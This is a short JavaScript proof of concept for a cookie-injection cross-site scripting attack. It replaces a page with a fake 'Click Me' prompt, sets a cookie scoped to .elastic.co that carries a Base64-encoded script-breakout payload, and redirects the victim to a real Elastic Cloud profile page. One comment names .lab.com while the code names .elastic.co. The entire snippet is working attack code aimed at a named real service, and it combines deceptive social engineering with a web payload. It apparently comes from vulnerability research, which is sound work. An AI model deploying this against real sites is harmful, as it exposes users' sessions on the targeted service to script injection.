// Replace the whole page with a fake "Click to continue" message
document.body.innerHTML = `
    <h1>Click the button below to continue.</h1>
    <button onclick="go()">Click Me</button>
`;

// When user clicks, we set a malicious cookie on .lab.com and redirect
function go() {
    // This Base64 decodes to:  --></script><script>alert(document.domain);// 
    document.cookie = "vulnerableCookie=LS0+PC9zY3JpcHQ+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOy8vIA==; path=/; domain=.elastic.co;";
    
    // Redirect the victim to the vulnerable page on the main domain
    window.location = "https://cloud.elastic.co/user/settings/profile";
}
